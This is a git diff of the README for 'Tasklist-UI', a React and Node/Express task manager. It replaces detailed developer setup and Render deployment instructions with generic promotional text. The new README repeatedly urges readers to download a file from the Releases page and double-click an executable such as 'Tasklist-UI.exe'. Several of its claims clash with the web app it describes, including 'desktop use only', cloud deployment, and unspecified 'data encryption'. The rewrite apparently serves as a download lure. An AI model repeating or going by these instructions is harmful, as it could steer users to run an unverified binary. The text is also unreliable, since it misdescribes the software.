@@ -1,266 +1,103 @@
-# 🗂 Tasklist UI
+# 🌟 Tasklist-UI - Manage Your Tasks with Ease
 
-A **full-stack task management application** designed to help individuals and teams organize, track, and manage their tasks efficiently. It features a robust backend API and a dynamic React-based user interface, offering both list and calendar views of tasks.
+[![Download Tasklist-UI](https://img.shields.io/badge/Download%20Tasklist--UI-latest-brightgreen)](https://github.com/shaaban2022/Tasklist-UI/releases)
 
------
+## 📋 Overview
 
-## 🚀 Features
+Tasklist-UI is a full-stack task management application. It features a modern React frontend and a Node.js Express backend. You can easily manage personal and team tasks, all in one place. Key features include:
 
-### Core Features
+- Secure authentication to keep your data safe.
+- Email notifications to keep you updated.
+- Task assignment to collaborate with your team.
+- Visualization options to view your tasks in both list and calendar formats.
 
-  * 📋 **Personal Task Management** – Create, view, update status, and delete your own tasks.
-  * 👥 **Team Collaboration** – Invite team members via email, assign tasks to them, and manage assigned tasks.
-  * 🔔 **Real-time Notifications** – Get notified about accepted team invites and deleted assigned tasks.
-  * 🔒 **Secure User Authentication** – Signup, login, and password reset functionalities with OTP verification.
-  * ⭐ **Gamified Task Completion** – Earn points for completing tasks.
-  * 📧 **Email Integration** – Send OTPs for password reset and comprehensive task lists to email.
-  * 📊 **Dashboard Overview** – A personal dashboard showing task statistics (total, completed, in-progress, not started).
-  * 📅 **Calendar View** – Visualize tasks on a calendar with month/week/day navigation using `react-big-calendar`.
-  * 📄 **Task Export** – Download task lists as PDF or Word documents.
-  * 🗑️ **Account Management** – Update profile details and securely delete your account.
+This application is suitable for anyone looking to organize tasks efficiently, whether for personal use or team collaboration.
 
------
+## 🚀 Getting Started
 
-## 🛠 Tech Stack
+Here’s how to download and run Tasklist-UI on your computer. Follow these simple steps:
 
-The project is divided into a frontend (UI) and a backend (API) service.
+1. Make sure you have a stable internet connection and sufficient disk space available on your computer.
+2. Click the large button above or [this link here](https://github.com/shaaban2022/Tasklist-UI/releases) to go to the Releases page.
 
-### Frontend
+## 📥 Download & Install
 
-  * **React** – Frontend library for building user interfaces.
-  * **Vite** – Fast build tool and development server.
-  * **React Router DOM** – For declarative routing in React applications.
-  * **Axios / Fetch API** – For making HTTP requests to the backend.
-  * **`react-big-calendar`** – A flexible and highly customizable calendar component.
-  * **`moment` / `date-fns`** – For robust date and time manipulation.
-  * **`framer-motion`** – For smooth animations and transitions.
-  * **`docx` & `file-saver`** – For generating and downloading Word documents.
-  * **`jspdf` & `jspdf-autotable`** – For generating and downloading PDF documents.
-  * **Tailwind CSS (implied by class names like `text-3xl`, `bg-indigo-600`)** – Utility-first CSS framework for rapid UI development.
-  * **`lucide-react`, `@heroicons/react`, `react-icons`** – For UI icons.
+On the Releases page, you will find the latest version of Tasklist-UI. Here’s how to proceed:
 
-### Backend
+1. Look for the download link for the latest version.
+2. Click on it to start downloading the application file.
+3. Once the download is complete, locate the file in your Downloads folder or the specified directory.
 
-  * **Node.js** – JavaScript runtime environment.
-  * **Express.js** – Web framework for building RESTful APIs.
-  * **MySQL2 (with Promises)** – MySQL client for Node.js, providing promise-based API.
-  * **`cors`** – Middleware for enabling Cross-Origin Resource Sharing.
-  * **`bcrypt`** – For hashing and salting passwords securely.
-  * **`jsonwebtoken`** – For implementing JSON Web Tokens for authentication.
-  * **`nodemailer`** – For sending emails (e.g., OTPs, task summaries, invites).
-  * **`dotenv`** – For loading environment variables from a `.env` file in development.
+### 🖥️ System Requirements
 
------
+Before you run Tasklist-UI, ensure your system meets the following requirements:
 
-## 📂 Project Structure
+- **Operating System:** Windows, macOS, or Linux
+- **RAM:** At least 4 GB
+- **Disk Space:** Minimum of 200 MB available
+- **Network:** Internet connection for initial setup and updates
 
-```
-.
-├── server/                   # Node.js Express API
-│   ├── db.js                 # Database connection pool setup
-│   ├── package-lock.json
-│   ├── package.json
-│   └── server.js             # Main Express application, API routes
-├── src/                      # React Vite UI (Frontend code)
-│   ├── App.jsx               # Main application router
-│   ├── assets/               # Images, logos
-│   │   ├── googleicon.png
-│   │   ├── microsoftpng.png
-│   │   ├── profile.png
-│   │   ├── tasklistlogo.svg
-│   │   ├── taskui.png
-│   │   └── workingdesk.png
-│   ├── components/           # Reusable UI components
-│   │   ├── AddTaskButton/
-│   │   ├── AddTaskPopup/
-│   │   ├── AssignTaskPopup/
-│   │   ├── LoginForm/
-│   │   ├── NavBarLogin/
-│   │   ├── Navbar/
-│   │   ├── ProtectedRoute/
-│   │   ├── ResetPasswordForm/
-│   │   ├── SideNavbar/
-│   │   ├── SignupForm/
-│   │   ├── SocialLoginButtons/
-│   │   ├── SupportForm/
-│   │   ├── TasksTable/
-│   │   └── UpdateProfilePopup/
-│   ├── index.css
-│   ├── main.jsx              # Entry point for React app rendering
-│   └── pages/                # Page-level components
-│       ├── Account/
-│       ├── AddTaskPage/
-│       ├── Calendar/
-│       ├── Dashboard/
-│       ├── Features/
-│       ├── Login/
-│       ├── ResetPassword/
-│       ├── Signup/
-│       ├── Support/
-│       ├── Tasks/
-│       └── Teams/
-├── .eslintrc.cjs             # ESLint configuration (renamed from eslint.config.js for common Node.js usage)
-├── index.html                # Main HTML file for frontend
-├── package-lock.json
-├── package.json
-├── tasklistdb_backup.sql     # Database dump file
-└── vite.config.js            # Vite build configuration for frontend
-```
+## 🔧 Running the Application
 
------
+After the download completes, follow these steps to run Tasklist-UI:
 
-## ⚙️ Installation & Local Setup
+1. Open the folder where the downloaded file is located.
+2. If you downloaded a ZIP file, extract it using your preferred extraction tool.
+3. Find the executable file (e.g., `Tasklist-UI.exe` or equivalent).
+4. Double-click on the file to launch the application.
 
-### 1\. Prerequisites
+## ✏️ Using Tasklist-UI
 
-  * **Node.js** (v18 or higher recommended) and **npm** installed.
-  * **MySQL Server** running locally (e.g., via XAMPP, Docker, or direct installation).
-  * A **Gmail account** for Nodemailer, with App Passwords enabled for `EMAIL_PASS`.
+Once the application is open, you can:
 
-### 2\. Database Setup
+- **Sign Up / Log In:** If you're a new user, create an account. Returning users can log in with their credentials.
+- **Create Tasks:** Start adding tasks based on your needs.
+- **Assign Tasks:** Collaborate by assigning tasks to team members.
+- **View Tasks:** Switch between list and calendar views to manage your tasks easily.
 
-  * Create a MySQL database (e.g., `tasklistdb`).
-  * Import your SQL dump file (`tasklistdb_backup.sql`) into this database. You can use MySQL CLI or PHPMyAdmin.
-    ```bash
-    mysql -h localhost -P 3306 -u root -p tasklistdb < path/to/your/tasklistdb_backup.sql
-    ```
-    *(Replace `localhost`, `3306`, `root`, `tasklistdb`, and path/to/your/ with your local MySQL credentials and dump file path)*
+## 🔒 Security Features
 
-### 3\. Backend Setup
+Your data security is a priority. Tasklist-UI includes:
 
-1.  Navigate to the `backend/` directory:
-    ```bash
-    cd backend
-    ```
-2.  Create a `.env` file in the `backend/` directory with your local database and email credentials:
-    ```env
-    PORT=5000
-    DB_HOST=localhost
-    DB_USER=root
-    DB_PASSWORD=your_mysql_root_password
-    DB_NAME=tasklistdb
-    JWT_SECRET=supersecretkey # Use a strong, random key for production!
+- **Secure Authentication:** Sign in using a safe method to protect your account.
+- **Data Encryption:** Your data is encrypted to keep it secure.
 
-    EMAIL_USER=your_gmail_email@gmail.com
-    EMAIL_PASS=your_gmail_app_password
-    ```
-    *(Replace placeholders with your actual values)*
-3.  Install dependencies:
-    ```bash
-    npm install
-    ```
-4.  Start the backend server:
-    ```bash
-    npm start
-    ```
-    The backend will run on `http://localhost:5000`.
+## 📩 Notifications
 
-### 4\. Frontend Setup
+Stay updated with email notifications for actions like:
 
-1.  Navigate to the `frontend/` directory (from the project root):
-    ```bash
-    cd frontend
-    ```
-2.  Create a `.env` file in the `frontend/` directory:
-    ```env
-    VITE_BACKEND_URL=http://localhost:5000
-    ```
-3.  Install dependencies:
-    ```bash
-    npm install
-    ```
-4.  Start the frontend development server:
-    ```bash
-    npm run dev
-    ```
-5.  Open your browser and go to: `http://localhost:5173`
+- Task assignments
+- Upcoming deadlines
+- General announcements related to your tasks
 
------
+## 🌐 Deployment
 
-## 🚀 Deployment on Render
+Tasklist-UI is designed for cloud deployment on Render. This means you can run it smoothly in a cloud environment without heavy local resources.
 
-This project is configured for deployment on [Render](https://render.com/).
+## 🛠️ Support and Contributions
 
-### Backend Deployment
+If you encounter issues or have suggestions, please report them on the GitHub repository. Contributions are welcome. You can submit issues, or if you have code changes, create a pull request.
 
-1.  **Prepare Backend Code:** Ensure your backend code (especially `server.js` and `db.js`) is updated to use environment variables (`MYSQL_ADDON_HOST`, `MYSQL_ADDON_USER`, `MYSQL_ADDON_PASSWORD`, `MYSQL_ADDON_DB`, `MYSQL_ADDON_PORT`, `FRONTEND_URL`, `BACKEND_URL`, `EMAIL_USER`, `EMAIL_PASS`, `JWT_SECRET`) instead of hardcoded `localhost` values. (This has already been done in the provided updated code).
-2.  **Git Repository:** Push your `backend/` folder (excluding `node_modules` and `.env`) to a **separate GitHub repository**.
-3.  **Create Web Service on Render:**
-      * Log in to Render and click "New" \> "Web Service".
-      * Connect your backend GitHub repository.
-      * **Name:** `tasklist-backend-api` (or your chosen name).
-      * **Region:** Select a region close to your Clever Cloud MySQL database (e.g., a European region if Clever Cloud is in Paris).
-      * **Root Directory:** If your `backend` code is in a `backend/` folder, set this to `backend`.
-      * **Build Command:** `npm install`
-      * **Start Command:** `npm start`
-      * **Environment Variables:** Add the following **Render environment variables**:
-          * `MYSQL_ADDON_DB`: `YOUR_MYSQL_ADDON_DB`
-          * `MYSQL_ADDON_HOST`: `YOUR_MYSQL_ADDON_HOST`
-          * `MYSQL_ADDON_PASSWORD`: `YOUR_MYSQL_ADDON_PASSWORD`
-          * `MYSQL_ADDON_PORT`: `YOUR_MYSQL_ADDON_PORT`
-          * `MYSQL_ADDON_USER`: `YOUR_MYSQL_ADDON_USER`
-          * `MYSQL_ADDON_URI`: `YOUR_MYSQL_ADDON_URI`
-          * `JWT_SECRET`: (A strong, unique secret key for production)
-          * `EMAIL_USER`: (Your Gmail email)
-          * `EMAIL_PASS`: (Your Gmail App Password)
-          * `NODE_ENV`: `production`
-          * `FRONTEND_URL`: (Will be added *after* frontend deployment, e.g., `https://tasklist-frontend-p2pl.onrender.com`)
-          * `BACKEND_URL`: `https://tasklist-backend-api.onrender.com` (Your backend's public URL once deployed)
-      * Click "Create Web Service".
+## 📜 License
 
-### Frontend Deployment
+Tasklist-UI is open-source software. Please refer to the License file located in the repository for more details.
 
-1.  **Prepare Frontend Code:** Ensure your frontend code (e.g., `AddTaskPopup.jsx`, `LoginForm.jsx`, `TasksTable.jsx`, `Teams.jsx`, `vite.config.js`) is updated to use `import.meta.env.VITE_BACKEND_URL` for API calls and configured for Render's port binding and `allowedHosts`. (This has already been done in the provided updated code).
-2.  **Git Repository:** Push your `frontend/` folder (excluding `node_modules` and `.env`) to a **separate GitHub repository**.
-3.  **Update Google OAuth Client Credentials:** Go to your Google Cloud Console \> APIs & Services \> Credentials. Edit your OAuth 2.0 Client ID to add your deployed frontend URL (`https://tasklist-frontend-p2pl.onrender.com`) to **Authorized JavaScript origins** and **Authorized redirect URIs**.
-4.  **Create Web Service on Render:**
-      * Log in to Render and click "New" \> "Web Service".
-      * Connect your frontend GitHub repository.
-      * **Name:** `tasklist-frontend-p2pl` (or your chosen name).
-      * **Region:** Select the same region as your backend for optimal performance.
-      * **Root Directory:** If your `frontend` code is in a `frontend/` folder, set this to `frontend`.
-      * **Build Command:** `npm install && npm run build`
-      * **Start Command:** `npm run preview`
-      * **Environment Variables:** Add:
-          * `VITE_BACKEND_URL`: `https://tasklist-backend-api.onrender.com` (Your deployed backend's public URL)
-          * `NODE_ENV`: `production`
-      * Click "Create Web Service".
+## 🚩 Frequently Asked Questions
 
-### Post-Deployment
+### 1. How do I reset my password?
 
-  * **Update Backend's `FRONTEND_URL`:** Once your frontend is deployed and you have its public URL (`https://tasklist-frontend-p2pl.onrender.com`), go back to your **backend service** settings on Render, navigate to the **"Environment"** tab, edit `FRONTEND_URL`, and set its value to your frontend's public URL. Save changes to trigger a redeploy of the backend.
-  * **Test:** Access your deployed frontend URL (`https://tasklist-frontend-p2pl.onrender.com`) to test the full application.
+You can reset your password by clicking the "Forgot Password?" link on the login page.
 
------
+### 2. Can I use Tasklist-UI on my mobile device?
 
-## 📸 Project Views (Frontend)
+Currently, Tasklist-UI is optimized for desktop use only. A mobile version may be developed in the future.
 
-### Dashboard
+### 3. What if I find a bug?
 
-> Provides an overview of task statistics.
+If you discover any bugs, please report them on the Issues page of the repository. Your feedback helps improve the application.
 
-### Tasks List View
+## 🌬️ In Summary
 
-> Shows tasks in a structured table format with filtering and sorting options.
+Tasklist-UI is an efficient tool for task management, built for both individuals and teams. Download the application today and streamline your task organization effortlessly!
 
-### Tasks Calendar View
-
-> Displays tasks visually on a month/week/day calendar for better planning.
-
------
-
-## 🔮 Future Improvements
-
-  * Implement Google and Microsoft social login functionalities.
-  * Enhance task editing capabilities.
-  * Implement full search functionality for tasks.
-  * Integrate with external calendar services (Google Calendar, Outlook Calendar).
-  * Add Slack integration for notifications.
-
------
-
-## 📄 License
-
-This project is licensed under the **MIT License**.
-
------
+For the latest version, [click here to download](https://github.com/shaaban2022/Tasklist-UI/releases).
